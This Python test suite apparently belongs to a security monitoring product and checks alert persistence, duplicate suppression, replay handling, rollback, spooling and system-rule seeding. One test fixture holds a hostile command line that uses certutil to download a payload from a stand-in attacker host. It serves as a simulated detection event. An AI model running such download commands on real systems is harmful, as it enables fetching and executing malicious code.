#!/usr/bin/env python3
"""
MONITORIX ENTERPRISE — PHASE 5.4.3B TEST SUITE (PART 2)
Detection Alert Persistence & System Rules Registration
=======================================================
Tests 9 to 15:
  9. Alert persistence verification (DetectionAlert creation)
 10. Duplicate event suppression (5-minute sliding window)
 11. Kafka replay behavior (HitCount increment, no duplicate rows)
 12. Database transaction failure & clean rollback
 13. Retry handling & DLQ spooling compatibility
 14. System rule registration (idempotent seeding of 9001-9008)
 15. Existing rule ID collision handling & protection
"""

import os
import sys
import time
import json
import asyncio
from datetime import datetime, timedelta
from typing import Dict, Any, List

# Ensure backend path is in sys.path
for candidate in ["/app", "/opt/projects/monitorix/watch-sec-python/backend"]:
    if os.path.exists(candidate) and candidate not in sys.path:
        sys.path.insert(0, candidate)

from sqlalchemy.ext.asyncio import create_async_engine, AsyncSession
from sqlalchemy.orm import declarative_base, sessionmaker
from sqlalchemy import Column, Integer, String, Text, DateTime, Boolean

from app.services.detection.sigma_compiler import (
    sigma_compiler,
    CompiledSigmaRule,
    DetectionResult
)
from app.services.detection.alert_persistence import (
    AlertPersistenceService,
    alert_persistence_service,
    DEDUPLICATION_WINDOW_MINUTES
)
from app.services.detection.system_rules import (
    RESERVED_SYSTEM_RULE_IDS,
    SYSTEM_RULES_DEFINITIONS,
    seed_system_rules,
    is_system_rule,
    validate_rule_modification_security
)

PASSED = 0
FAILED = 0
TEST_RESULTS = []


def record_result(test_num: int, name: str, passed: bool, duration_ms: float, detail: str = ""):
    global PASSED, FAILED
    status = "PASS" if passed else "FAIL"
    if passed:
        PASSED += 1
    else:
        FAILED += 1
    TEST_RESULTS.append({
        "test_num": test_num,
        "name": name,
        "status": status,
        "duration_ms": duration_ms,
        "detail": detail
    })
    print(f"  [{status}] #{test_num:02d}: {name} ({duration_ms:.2f}ms) {detail}")


# In-memory mock database for isolated testing
class MockDB:
    def __init__(self):
        self.alerts: List[Any] = []
        self.rules: Dict[int, Any] = {}
        self.next_alert_id = 1
        self.committed = False
        self.rolled_back = False
        self.fail_on_commit = False

    def add(self, obj):
        if hasattr(obj, "__tablename__") and obj.__tablename__ == "DetectionAlerts" or hasattr(obj, "MatchedContent"):
            if not getattr(obj, "Id", None):
                obj.Id = self.next_alert_id
                self.next_alert_id += 1
            self.alerts.append(obj)
        elif hasattr(obj, "__tablename__") and obj.__tablename__ == "DetectionRules" or hasattr(obj, "RuleContent"):
            self.rules[obj.Id] = obj

    async def commit(self):
        if self.fail_on_commit:
            raise RuntimeError("Simulated Database Commit Failure")
        self.committed = True

    async def rollback(self):
        self.rolled_back = True

    async def execute(self, query):
        class MockResult:
            def __init__(self, items):
                self._items = items
            def scalars(self):
                return self
            def all(self):
                return self._items
            def first(self):
                return self._items[0] if self._items else None

        q_str = str(query)
        
        # DetectionAlerts query
        if "DetectionAlerts" in q_str:
            # Check for sliding window query
            return MockResult(list(self.alerts))

        # DetectionRules query
        if "DetectionRules" in q_str:
            return MockResult(list(self.rules.values()))

        return MockResult([])


async def run_suite():
    global PASSED, FAILED
    print("=" * 80)
    print("MONITORIX ENTERPRISE — PHASE 5.4.3B TEST SUITE (PART 2)")
    print("Alert Persistence & System Rules Registration (Tests 09-15)")
    print("=" * 80)

    # --------------------------------------------------------------------------
    # TEST 09: Alert persistence verification
    # --------------------------------------------------------------------------
    t0 = time.perf_counter()
    mock_db = MockDB()
    test_result = DetectionResult(
        matched=True,
        rule_id=201,
        rule_name="Suspicious LOLBAS Ingress",
        severity="High",
        category="Initial Access",
        matched_selections=["selection_1"],
        mitre_tactics=["TA0001 (Initial Access)"],
        mitre_techniques=["T1133"],
        details={"image": "certutil.exe", "url": "http://evil.com/payload.exe"}
    )
    event_data = {
        "EventType": "ProcessExecution",
        "AgentId": "AGENT-009",
        "TenantId": 1,
        "CommandLine": "certutil.exe -urlcache -split -f http://evil.com/payload.exe",
        "Timestamp": datetime.utcnow().isoformat()
    }
    alert, is_new = await alert_persistence_service.persist_detection_match(
        db=mock_db,
        event=event_data,
        match=test_result,
        agent_id="AGENT-009",
        authoritative_tenant_id=1
    )
    await mock_db.commit()
    d9 = (time.perf_counter() - t0) * 1000
    p9 = (
        is_new is True and
        alert.AgentId == "AGENT-009" and
        alert.RuleId == 201 and
        alert.HitCount == 1 and
        alert.Status == "New" and
        "certutil.exe" in alert.MatchedContent and
        len(mock_db.alerts) == 1
    )
    record_result(9, "Alert Persistence & DetectionAlert Creation", p9, d9)

    # --------------------------------------------------------------------------
    # TEST 10: Duplicate event suppression (5-minute sliding window)
    # --------------------------------------------------------------------------
    t0 = time.perf_counter()
    # Feed identical event within window
    alert_dup, is_new_dup = await alert_persistence_service.persist_detection_match(
        db=mock_db,
        event=event_data,
        match=test_result,
        agent_id="AGENT-009",
        authoritative_tenant_id=1
    )
    d10 = (time.perf_counter() - t0) * 1000
    p10 = (
        is_new_dup is False and
        alert_dup.HitCount == 2 and
        alert_dup.Id == alert.Id and
        len(mock_db.alerts) == 1  # No duplicate row created
    )
    record_result(10, "Duplicate Event Suppression & HitCount Increment", p10, d10)

    # --------------------------------------------------------------------------
    # TEST 11: Kafka replay behavior (10 repeated replayed events)
    # --------------------------------------------------------------------------
    t0 = time.perf_counter()
    for _ in range(8):  # 2 already recorded + 8 = 10 total
        await alert_persistence_service.persist_detection_match(
            db=mock_db,
            event=event_data,
            match=test_result,
            agent_id="AGENT-009",
            authoritative_tenant_id=1
        )
    d11 = (time.perf_counter() - t0) * 1000
    p11 = (
        len(mock_db.alerts) == 1 and
        mock_db.alerts[0].HitCount == 10
    )
    record_result(11, "Kafka Replay Immunity (10 Replays -> 1 Row, HitCount=10)", p11, d11)

    # --------------------------------------------------------------------------
    # TEST 12: Database transaction failure & clean rollback
    # --------------------------------------------------------------------------
    t0 = time.perf_counter()
    failing_db = MockDB()
    failing_db.fail_on_commit = True
    rollback_occurred = False
    exception_caught = False

    try:
        await alert_persistence_service.persist_matches_batch(
            db=failing_db,
            event=event_data,
            matches=[test_result],
            agent_id="AGENT-FAIL",
            authoritative_tenant_id=1
        )
    except RuntimeError:
        exception_caught = True
        rollback_occurred = failing_db.rolled_back

    d12 = (time.perf_counter() - t0) * 1000
    p12 = exception_caught and rollback_occurred
    record_result(12, "Database Transaction Failure & Explicit Rollback", p12, d12)

    # --------------------------------------------------------------------------
    # TEST 13: Retry handling & DLQ spooling compatibility
    # --------------------------------------------------------------------------
    t0 = time.perf_counter()
    from app.workers.dlq_manager import DLQManager
    import tempfile
    
    with tempfile.TemporaryDirectory() as tmp_dlq_dir:
        test_dlq = DLQManager(spool_dir=tmp_dlq_dir)
        failed_batch = [
            ("evt-001", "AGENT-001", "1", "ProcessExecution", datetime.utcnow(), event_data),
            ("evt-002", "AGENT-002", "1", "ProcessExecution", datetime.utcnow(), event_data)
        ]
        spool_path = await test_dlq.spool_failed_batch(failed_batch, reason="Test simulated DB outage")
        metrics = test_dlq.get_metrics()
        
        p13 = (
            os.path.exists(spool_path) and
            metrics["total_spooled_records"] == 2 and
            metrics["pending_spool_files"] == 1
        )
    d13 = (time.perf_counter() - t0) * 1000
    record_result(13, "Retry Handling & Spooling to Durable Disk DLQ", p13, d13)

    # --------------------------------------------------------------------------
    # TEST 14: System rule registration (idempotent seeding of 9001-9009)
    # --------------------------------------------------------------------------
    t0 = time.perf_counter()
    rules_db = MockDB()
    # First seed: should register all 9
    seed_res_1 = await seed_system_rules(rules_db)
    
    # Second seed: should detect existing without duplicating
    seed_res_2 = await seed_system_rules(rules_db)
    d14 = (time.perf_counter() - t0) * 1000
    p14 = (
        seed_res_1["seeded"] == 9 and
        seed_res_2["seeded"] == 0 and
        seed_res_2["verified_existing"] == 9 and
        len(rules_db.rules) == 9 and
        all(r.TenantId is None for r in rules_db.rules.values()) and
        all(r.IsActive is True for r in rules_db.rules.values())
    )
    record_result(14, "System Rule Registration & Idempotent Seeding (9001-9009)", p14, d14)

    # --------------------------------------------------------------------------
    # TEST 15: Existing rule ID collision handling & protection
    # --------------------------------------------------------------------------
    t0 = time.perf_counter()
    collision_db = MockDB()
    # Pre-populate rule 9001 belonging to Tenant 42
    from app.db.models import DetectionRule
    collision_db.rules[9001] = DetectionRule(
        Id=9001,
        TenantId=42,  # Custom tenant rule collision
        Name="Custom Tenant 42 Rule",
        Type="Sigma",
        RuleContent="title: Custom Rule",
        IsActive=True
    )
    seed_collision = await seed_system_rules(collision_db)
    d15 = (time.perf_counter() - t0) * 1000
    p15 = (
        len(seed_collision["collisions"]) == 1 and
        seed_collision["collisions"][0]["rule_id"] == 9001 and
        seed_collision["collisions"][0]["existing_tenant_id"] == 42 and
        collision_db.rules[9001].Name == "Custom Tenant 42 Rule"  # Not overwritten!
    )
    record_result(15, "Rule ID Collision Detection & Tenant Rule Protection", p15, d15)

    print("\n" + "=" * 80)
    print(f"PART 2 TOTAL: 7 | PASSED: {PASSED} | FAILED: {FAILED}")
    print("=" * 80)
    return FAILED == 0


if __name__ == "__main__":
    success = asyncio.run(run_suite())
    sys.exit(0 if success else 1)
